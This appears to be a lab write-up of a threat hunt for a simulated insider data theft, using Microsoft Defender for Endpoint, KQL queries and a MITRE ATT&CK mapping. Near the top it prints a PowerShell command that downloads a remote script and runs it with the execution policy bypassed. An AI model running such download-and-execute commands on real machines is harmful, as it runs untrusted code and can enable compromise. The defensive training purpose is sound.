# 🛡️ Threat Hunting: Data Exfiltration by PIPd Employee (Simulated)

## 📁 Overview
This project documents the threat hunting investigation of a simulated data exfiltration attempt using Microsoft Defender for Endpoint (MDE), PowerShell, and KQL queries. The incident was initiated by executing a malicious PowerShell script that created and zipped employee data.

---

## 💣 Initial Setup: Simulated Attack
To generate logs for hunting, a PowerShell script named `exfiltratedata.ps1` was executed in a Windows VM (labuser).

Script executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```
![Malicious Code that was I runned before doing the threat hunt](https://github.com/user-attachments/assets/534ba0a4-90f5-429b-8b6a-95c464a58789)


### What the Malicious Script Does:
- Creates fake employee data (names, SSNs, salaries)
- Saves the data to a CSV file
- Compresses the file into a ZIP using 7-Zip
- Logs the actions to a file: `C:\ProgramData\entropygorilla.log`

---

## 🚩 Scenario Summary
- A disgruntled employee, John Doe, suspected of data theft after being placed on a PIP
- Script silently downloaded and archived fake employee data
- Analysis revealed archive and PowerShell activity using `7z.exe`

---

## 🧪 Steps Performed

### 1. Preparation
- Hypothesis: John may compress and exfiltrate sensitive data
- Reason: Admin privileges, performance concerns, behavioral red flags

### 2. Data Collection
Queried logs in MDE:
I did a search within MDE DeviceFileEvents for any activities with zip files, and found a suspicious activity involving a file named 7.zip created at Jun 16, 2025 12:26:25 AM and confirmed `7z.exe` used around the same timestamp a ZIP file was created:
```kql
DeviceFileEvents
| where DeviceName == "labuser"
| where FileName endswith ".zip"
| order by Timestamp desc
```
![Screenshot 2025-06-16 231527](https://github.com/user-attachments/assets/af7eae97-c5da-4785-8d67-fddcb51c0fb4)

### 3. Data Analysis
I took one of the instances of a zip file being created, took the timestamp and searched under DeviceProcessEvents for any Look for any kind of archive activity that included the 7-zip file. I discovered around the same time, a powershell script silently installed 7zip and then used 7zip to zip up employee data into an archive who’s Device Name is michealvm
Queried logs in MDE:
```kql
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe"]);
let VMName = "labuser";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
```
![Screenshot 2025-06-16 234256](https://github.com/user-attachments/assets/7c34a8b0-dbe4-493d-a08e-01b1721d5e65)

### 4. Investigation
Located execution of PowerShell and download activity:

Confirmed script downloaded and executed `exfiltratedata.ps1` silently.

![Capture3 (1)](https://github.com/user-attachments/assets/02905b4e-0045-4514-b8a3-52cffa997b46)

![Capture4 (1)](https://github.com/user-attachments/assets/9993d8d0-39a0-4a65-9e03-ba55dec38343)

# End logging
Log-Message "Script execution completed successfully."
### 5. Response
Steps taken:
- ✅ Isolated the endpoint via Microsoft Defender
- ✅ Alerted management of potential data archiving
- ✅ Verified no outbound exfiltration occurred during test
![Screenshot 2025-06-16 231527](https://github.com/user-attachments/assets/246c384e-1a79-4d1d-b7d5-b8e4de92bb17)

### 6. Documentation
Documented full investigation, timestamps, KQL queries, and matching MITRE techniques. All screenshots and findings are included in this repository.
Notes I took for documentation of steps:
file:///C:/Users/arbof/Downloads/Untitled%20document.pdf
### 7. Improvement
- 🔐 Improve PowerShell script logging
- 📦 Alert on archive creation by unexpected processes
- 👮‍♂️ Limit admin rights for non-IT staff
- 🧠 Include 7-Zip and other archivers in threat detection rules

---

## 🧬 MITRE ATT&CK TTP Mapping
| Tactic             | Technique                            | ID         |
|--------------------|----------------------------------------|------------|
| Execution          | PowerShell                            | T1059.001  |
| Defense Evasion    | Obfuscated Files or Information        | T1027      |
| Collection         | Archive via Utility                    | T1560.001  |
| Collection         | Data from Local System                 | T1005      |
| Exfiltration       | Exfiltration Over C2 Channel           | T1041      |
| Discovery          | File and Directory Discovery           | T1083      |
| Persistence        | Scheduled Task/Job                     | T1053.005  |
| Command & Control  | Ingress Tool Transfer                  | T1105      |
| Exfiltration       | Exfiltration to Cloud Storage          | T1567.002  |
| Execution          | User Execution: Malicious File         | T1204.002  |
| Defense Evasion    | Masquerading                           | T1036      |

---

## 📌 Recommendations
- Alert on unexpected use of PowerShell downloading scripts
- Audit scheduled task creations
- Monitor and alert on use of 7-Zip, WinRAR, etc.
- Limit user access to scripting tools

---

## 🧰 Tools Used
- Microsoft Defender for Endpoint (Advanced Hunting)
- Windows PowerShell ISE
- PowerShell Command Line
- KQL (Kusto Query Language)

---

Project maintained by: Felipe Restrepo  
Date: June 17, 2025
